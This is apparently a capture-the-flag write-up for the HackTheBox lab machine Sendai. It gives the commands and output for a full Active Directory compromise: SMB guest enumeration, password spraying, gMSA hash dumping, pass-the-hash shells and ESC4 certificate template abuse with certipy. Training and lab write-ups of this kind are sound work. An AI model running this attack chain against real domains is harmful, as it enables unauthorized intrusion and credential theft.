---
icon: tree
---

# HTB-SENDAI (VL)

<figure><img src="../../../../.gitbook/assets/image (475).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance & Initial Enumeration

#### Nmap Scan Results

Initial port scanning reveals standard Windows Domain Controller services:

* SMB (445/tcp)
* LDAP (389/tcp)
* Kerberos (88/tcp)
* DNS (53/tcp)
* RPC (135/tcp)

#### SMB Guest Access Enumeration

First, we generate a hosts file from our SMB scan:

```bash
nxc smb 10.129.234.66 --generate-hosts-file /etc/hosts
```

Testing SMB guest access:

```bash
nxc smb dc.sendai.vl -u 'guest' -p ''
```

**Result**: Guest access is enabled on the domain controller.

#### SMB Share Enumeration

Enumerate available SMB shares using guest credentials:

```bash
smbmap -H dc.sendai.vl -d 'sendai.vl' -u 'guest' -p ''
```

**Discovered Shares**:

* `sendai` - Accessible anonymously
* `Users` - Accessible anonymously

#### Accessing SMB Shares

**Checking Users Share**:

```bash
smbclient //10.129.234.66/Users -N
```

**Result**: Nothing interesting found in the Users share.

**Accessing Sendai Share**:

```bash
smbclient //10.129.234.66/sendai -N
```

**Downloaded Files**:

```bash
get incident.txt
```

#### Recursive SMB Enumeration

Using an older version of smbmap (4.8.2) for better file listing:

```bash
smbmap_old.py -H dc.sendai.vl -d 'sendai.vl' -u 'guest' -p '' -R
```

**Result**: No additional interesting files found.

***

### Analyzing incident.txt

**Content of incident.txt**:

```
Dear valued employees,

We hope this message finds you well. We would like to inform you about an important
security update regarding user account passwords. Recently, we conducted a thorough
penetration test, which revealed that a significant number of user accounts have weak and
insecure passwords.

To address this concern and maintain the highest level of security within our
organization, the IT department has taken immediate action. All user accounts with
insecure passwords have been expired as a precautionary measure. This means that affected
users will be required to change their passwords upon their next login.

We kindly request all impacted users to follow the password reset process promptly to
ensure the security and integrity of our systems. Please bear in mind that strong
passwords play a crucial role in safeguarding sensitive information and protecting our
network from potential threats.

If you need assistance or have any questions regarding the password reset procedure,
please don't hesitate to reach out to the IT support team. They will be more than happy
to guide you through the process and provide any necessary support.

Thank you for your cooperation and commitment to maintaining a secure environment for all
of us. Your vigilance and adherence to robust security practices contribute significantly
to our collective safety.
```

**Key Information**: The incident report reveals that many user accounts with weak passwords have been expired, requiring password changes on next login. This suggests potential for password spraying attacks.

***

### User Enumeration & Password Spraying

#### RID Brute Force

Extract user list via RID brute-force:

```bash
nxc smb dc.sendai.vl -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 > users.txt
```

**Result**: Successfully extracted domain users list.

#### Password Spraying with Empty Passwords

Attempt password spraying with empty passwords:

```bash
nxc smb DC.sendai.vl -u users.txt -p '' --continue-on-success
```

**Results**:

* `Elliot.Yates` - STATUS\_PASSWORD\_MUST\_CHANGE
* `Thomas.Powell` - STATUS\_PASSWORD\_MUST\_CHANGE

🔑 **Key Finding**: Both users return `STATUS_PASSWORD_MUST_CHANGE`, confirming they have expired passwords as mentioned in the incident report.

#### Password Reset

Change Thomas.Powell's password:

```bash
nxc smb DC.sendai.vl -u Thomas.Powell -p '' -M change-password -o NEWPASS='pa$$w0rd'
```

**Result**: Successfully changed Thomas.Powell's password to 'pa\$$w0rd'.

***

### Bloodhound Enumeration

#### Domain Enumeration with Thomas.Powell

Collect domain information using Bloodhound:

```bash
bloodhound-python -u 'Thomas.Powell' -p 'pa$$w0rd' -d 'sendai.vl' -c All -ns 10.129.234.66 --dns-tcp --zip
```

<figure><img src="../../../../.gitbook/assets/image (480).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (481).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (482).png" alt=""><figcaption></figcaption></figure>

#### Bloodhound Analysis Results

**Key Findings**:

1. `thomas.powell` is a member of the `Support` Group
2. The `Support` Group has `GenericAll` rights on the `admsvc` Group
3. This means we can add Thomas to the `admsvc` Group
4. The `admsvc` Group has `ReadGMSAPassword` over the `MGTSVC$` User
5. `MGTSVC$` User is in the Remote Management Group (our entry point)

#### Attack Chain Summary

```
Thomas.Powell (Support) → GenericAll on admsvc → ReadGMSAPassword on MGTSVC$ → Remote Management
```

***

### Privilege Escalation Chain

#### Adding User to admsvc Group

Add Thomas.Powell to the admsvc group:

```bash
bloodyAD -u 'Thomas.Powell' -p 'pa$$w0rd' -d 'sendai.vl' --host 'DC.sendai.vl' add groupMember "admsvc" 'Thomas.Powell'
```

**Result**: Successfully added Thomas.Powell to admsvc group.

#### GMSA Password Enumeration

Enumerate gMSA passwords with Thomas.Powell:

```bash
nxc ldap DC.sendai.vl -u 'Thomas.Powell' -p 'pa$$w0rd' --gmsa
```

**Output**:

```
MGTSVC$: 9ed35c68b88f35007aa32c14c1332ce7
```

**Key Finding**: Obtained NTLM hash for MGTSVC$ account.

***

### Initial Shell Access

#### Evil-WinRM Connection

Access DC via Evil-WinRM with mgtsvc$ hash:

```bash
evil-winrm -i DC.sendai.vl -u 'sendai.vl\mgtsvc$' -H '9ed35c68b88f35007aa32c14c1332ce7'
```

**Result**: Successfully obtained shell as mgtsvc$ on the Domain Controller.

#### User Flag

Retrieve the user flag:

```bash
type C:\user.txt
```

**User Flag Obtained**: Successfully retrieved user.txt from C:\\

***

### Lateral Movement & Credential Discovery

#### Process Enumeration

Enumerate running processes:

```bash
Get-Process
```

#### Registry Service Enumeration

**Searching for EC2Launch services**:

```bash
Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | Select-Object ImagePath | Select-String ec2
```

**Result**: Found EC2Launch service at `C:\Program Files\Amazon\EC2Launch\service\EC2LaunchService.exe` (no sensitive information).

**Searching for MicrosoftEdge services**:

```bash
Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | Select-Object ImagePath | Select-String MicrosoftEdge
```

**Result**: No sensitive information found.

**Searching for helpdesk services**:

```bash
Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | Select-Object ImagePath | Select-String helpdesk
```

**Success**: Found helpdesk service with embedded credentials!

**Credential Discovery**: The helpdesk service configuration revealed:

* **Username**: `clifford.davey`
* **Password**: `RFmoB2WplgE_3p` (in plaintext)

#### Credential Validation

Verify the discovered credentials:

```bash
nxc smb DC.sendai.vl -u clifford.davey -p RFmoB2WplgE_3p
```

**Result**: Credentials are valid. Clifford.Davey is a member of the CA-Operators group.

***

### ADCS Exploitation (ESC4)

#### Certificate Template Enumeration

Enumerate vulnerable certificate templates:

```bash
certipy-ad find -u 'Clifford.Davey'@'sendai.vl' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -vulnerable -enabled
```

**Discovered Vulnerability**: ESC4 in SendaiComputer template

**Template Details**:

```
Template Name: SendaiComputer
Display Name: SendaiComputer
Certificate Authorities: sendai-DC-CA
Enabled: True
Client Authentication: True
Enrollment Agent: False
Any Purpose: False
Enrollee Supplies Subject: False
Certificate Name Flag: SubjectAltRequireDns
Enrollment Flag: AutoEnrollment
Extended Key Usage: Server Authentication, Client Authentication
Requires Manager Approval: False
Requires Key Archival: False
Authorized Signatures Required: 0
Schema Version: 2
Validity Period: 100 years
Renewal Period: 6 weeks
Minimum RSA Key Length: 4096

Permissions:
- User Enrollable Principals: SENDAI.VL\Domain Computers, SENDAI.VL\ca-operators
- User ACL Principals: SENDAI.VL\ca-operators

[!] Vulnerabilities:
ESC4: User has dangerous permissions.
```

#### Administrator SID Enumeration

Get Administrator SID (required for ESC4):

```bash
ldapsearch -H ldap://10.129.234.66 -D 'clifford.davey@sendai.vl' -w 'RFmoB2WplgE_3p' -b "DC=sendai,DC=vl" "(sAMAccountName=Administrator)" objectSid | grep 'objectSid::' | cut -d' ' -f2 | base64 -d | python3 -c 'import sys;d=sys.stdin.buffer.read();sid="S-"+str(d[0])+"-"+str(int.from_bytes(d[2:8],"little"));sid+="-"+"-".join(str(int.from_bytes(d[i:i+4],"little")) for i in range(8,len(d),4));print(sid)'
```

**Administrator SID**: `S-1-5-21-3085872742-570972823-736764132-500`

#### ESC4 Exploitation Steps

**Step 1**: Activate Certipy virtual environment (using older version for ESC4):

```bash
source '/usr/local/bin/certipy42-env/bin/activate'
```

**Step 2**: Modify the SendaiComputer template:

```bash
certipy template -u 'clifford.davey' -p 'RFmoB2WplgE_3p' \
-template SendaiComputer -dc-ip 10.129.234.66 -save-old
```

**Step 3**: Request certificate for Administrator:

```bash
certipy req -u 'clifford.davey' -p 'RFmoB2WplgE_3p' \
-ca sendai-DC-CA -template SendaiComputer \
-upn administrator@sendai.vl \
-sid S-1-5-21-3085872742-570972823-736764132-500 \
-dc-ip 10.129.234.66
```

**Step 4**: Restore the SendaiComputer template:

```bash
certipy template -u 'clifford.davey' -p 'RFmoB2WplgE_3p' \
-template SendaiComputer -dc-ip 10.129.234.66 \
-configuration SendaiComputer.json
```

**Step 5**: Authenticate using the certificate:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.234.66
```

**Administrator Hash**: `cfb106feec8b89a3d98e14dcbe8d087a`

***

### Root Access

#### Administrator Shell

Access DC as Administrator:

```bash
evil-winrm -i DC.sendai.vl -u 'sendai.vl\administrator' -H 'cfb106feec8b89a3d98e14dcbe8d087a'
```

**Result**: Successfully obtained Administrator shell on Domain Controller.

#### Root Flag

Retrieve the root flag:

```bash
type C:\Users\Administrator\Desktop\root.txt
```

**Root Flag Obtained**: Successfully retrieved root.txt and achieved full domain compromise.

***

### Attack Flow

The complete attack chain for Sendai:

```
1. SMB Guest Access → Share Enumeration → incident.txt Discovery
2. RID Brute Force → User Enumeration → Password Spraying
3. Password Reset (Thomas.Powell) → Domain Authentication
4. Bloodhound Enumeration → AD Privilege Analysis
5. Group Manipulation (Support → admsvc) → GMSA Access
6. GMSA Hash Dump (MGTSVC$) → DC Shell Access
7. Registry Enumeration → Service Credential Discovery (clifford.davey)
8. ADCS Enumeration → ESC4 Vulnerability Identification
9. Certificate Template Manipulation → Administrator Certificate Request
10. Certificate Authentication → Full Domain Compromise
```

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
